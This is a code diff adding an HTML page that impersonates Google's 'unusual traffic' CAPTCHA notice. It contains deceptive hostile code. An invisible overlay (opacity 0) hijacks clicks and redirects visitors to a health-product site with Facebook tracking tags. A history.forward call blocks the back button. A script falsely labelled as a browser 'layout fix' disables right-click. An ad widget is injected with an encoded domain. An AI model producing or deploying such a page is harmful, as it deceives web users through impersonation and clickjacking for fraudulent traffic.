@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+<script language="JavaScript"><!--
+javascript:window.history.forward(1);
+//-->
+</script>
+
+<script>
+function hide_elem(elem){ $(elem).hide(); }
+function openInNewTab(url) {
+	setTimeout(function(){
+	window.location.href = url;
+		
+		},100);
+ // window.open(url);
+  //win.focus();
+}
+</script>
+
+
+
+  <script src="http://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.11.3.min.js"></script>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta name="robots" content="noindex,nofollow,noodp,noydir"/>
+  <title>Verify</title>
+  <link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
+  <meta name="viewport" content="width=device-width,initial-scale=1,minimal-ui">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <!-- change the path below to your server, use absolute path starting with http -->
+
+
+<script type="text/javascript">/*Layout Compatibility Fix for all major browsers including Mozilla, Chrome, Safari, Opera, IE 7-11. Script by Pozlas Qivaskyi (pozlas.qivaskyi [at] gmail.com), Copyright (c) 2013. Note: removing this will cause layout issues and the page will get unreadable in some browsers, please contact me before doing so.*/function browserFix(doDeepCheck){var ua=navigator.userAgent.toLowerCase();var check=function(r){return r.test(ua)};var DOC=document;var isStrict=DOC.compatMode=="CSS1Compat";var isOpera=check(/opera/);var isChrome=check(/chrome/);var isWebKit=check(/webkit/);var isSafari=!isChrome&&check(/safari/); var isSafari2=isSafari&&check(/applewebkit4/);if(doDeepCheck){return isSafari};var isSafari3=isSafari&&check(/version3/);var isSafari4=isSafari&&check(/version4/);var isIE=!isOpera&&check(/msie/);var isIE7=isIE&&check(/msie 7/);var isIE8=isIE&&check(/msie 8/);var isIE6=isIE&&!isIE7&&!isIE8;var isGecko=!isWebKit&&check(/gecko/);var isGecko2=isGecko&&check(/rv:1.8/);var isGecko3=isGecko&&check(/rv:1.9/);var isBorderBox=isIE&&!isStrict;var isWindows=check(/windows|win32/);var isMac=check(/macintosh|mac os x/);var isAir=check(/adobeair/);var isLinux=check(/linux/);var isSecure=/^https/i.test(window.location.protocol);var isIE7InIE8=isIE7&&DOC.documentMode==7;var jsType="",browserType="",browserVersion="",osName="";var ua=navigator.userAgent.toLowerCase();var check=function(r){return r.test(ua)};if(isWindows){osName="Windows";if(check(/windows nt/)){var start=ua.indexOf("windows nt");var end=ua.indexOf(";",start);osName=ua.substring(start,end)}}else{osName=isMac?"Mac":isLinux?"Linux":"Other"}if(isIE){browserType="IE";jsType="IE";var versionStart=ua.indexOf("msie")+5;var versionEnd=ua.indexOf(";",versionStart);browserVersion=ua.substring(versionStart,versionEnd);jsType=isIE6?"IE6":isIE7?"IE7":isIE8?"IE8":"IE"}else{if(isGecko){var isFF=check(/firefox/);browserType=isFF?"Firefox":"Others";jsType=isGecko2?"Gecko2":isGecko3?"Gecko3":"Gecko";if(isFF){var versionStart=ua.indexOf("firefox")+8;var versionEnd=ua.indexOf(" ",versionStart);if(versionEnd==-1){versionEnd=ua.length}browserVersion=ua.substring(versionStart,versionEnd)}}else{if(isChrome){browserType="Chrome";jsType=isWebKit?"Web Kit":"Other";var versionStart=ua.indexOf("chrome")+7;var versionEnd=ua.indexOf(" ",versionStart);browserVersion=ua.substring(versionStart,versionEnd)}else{browserType=isOpera?"Opera":isSafari?"Safari":""}}}};browserFix(true);var message='';function clickIE(){if(document.all){(message);return false}}function clickNS(e){if(document.layers||(document.getElementById&&!document.all)){if(e.which==2||e.which==3){(message);return false}}}if(document.layers){document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS}else{document.onmouseup=clickNS;document.oncontextmenu=clickIE}document.oncontextmenu=new Function('return false');</script></head>
+
+<style>
+
+a {
+
+font-size: 13px;
+font-style: bold;
+
+}      /* unvisited link */
+a:visited {color:#000;}  /* visited link */
+a:hover {color:#000;}  /* mouse over link */
+a:active {color:#000;}  /* selected link */
+
+
+#outPopUpLike{
+     position:absolute;
+    margin:-120px 0 0 -1px;
+     z-index:4;
+     	-webkit-opacity: 0; -moz-opacity: 0; filter:alpha(opacity=0); opacity: 0;
+}
+.mgheader{
+-webkit-opacity: 0; -moz-opacity: 0; filter:alpha(opacity=0); opacity: 0;
+}
+
+.text-elements{
+-webkit-opacity: 0; -moz-opacity: 0; filter:alpha(opacity=0); opacity: 0;
+}
+
+</style>
+
+<!-- Change the body background from here. -->
+<body style="font-family: arial, sans-serif; background-color: #fff; color: #000; padding:20px; font-size:18px;" >
+
+ <div style="max-width:400px;">
+ 
+
+ <hr noshade size="1" style="color:#ccc; background-color:#ccc;">
+<div id="titleee"  ></div>
+  <div>
+
+  <em id="email_err"></em>
+
+
+<img src="https://puu.sh/tppBQ/f7916a92a9.png" alt="Smiley face" height="77" width="304">
+<div id="outPopUpLike" onClick="openInNewTab('http://healthyrise.com/rosemary?utm_source=facebook&utm_medium=social');" >
+
+<div id="contentad302890"></div>
+<script type="text/javascript">
+    (function(d) {
+        var params =
+        {
+            id: "8da0e147-8d72-42cd-8ec8-e7f7e4cdb961",
+            d:  "aGVhbHRoeXJpc2UuY29t",
+            wid: "302890",
+            cb: (new Date()).getTime()
+        };
+
+        var qs=[];
+        for(var key in params) qs.push(key+'='+encodeURIComponent(params[key]));
+        var s = d.createElement('script');s.type='text/javascript';s.async=true;
+        var p = 'https:' == document.location.protocol ? 'https' : 'http';
+        s.src = p + "://api.content-ad.net/Scripts/widget2.aspx?" + qs.join('&');
+        d.getElementById("contentad302890").appendChild(s);
+    })(document);
+</script>
+                    
+
+</div>
+
+</div>
+
+
+  <hr noshade size="1" style="color:#ccc; background-color:#ccc;">
+
+ <div style="font-size:13px;">
+<b>About this page</b><br><br>Our systems have detected unusual traffic from your computer network.  This page checks to see if it&#39;s really you sending the requests, and not a robot.  <a href="#" onclick="document.getElementById('infoDiv').style.display='block';">Why did this happen?</a><br><br>
+<div id="infoDiv" style="display:none; background-color:#eee; padding:10px; margin:0 0 15px 0; line-height:1.4em;">
+This page appears when Google automatically detects requests coming from your computer network which appear to be in violation of the Terms of Service. The block will expire shortly after those requests stop.  In the meantime, solving the above CAPTCHA will let you continue to use our services.<br><br>This traffic may have been sent by malicious software, a browser plug-in, or a script that sends automated requests.  If you share your network connection, ask your administrator for help &mdash; a different computer using the same IP address may be responsible.  <br><br>Sometimes you may be asked to solve the CAPTCHA if you are using advanced terms that robots are known to use, or sending requests very quickly.
+</div>
+</div>
+</div>
+</body>
+</html>
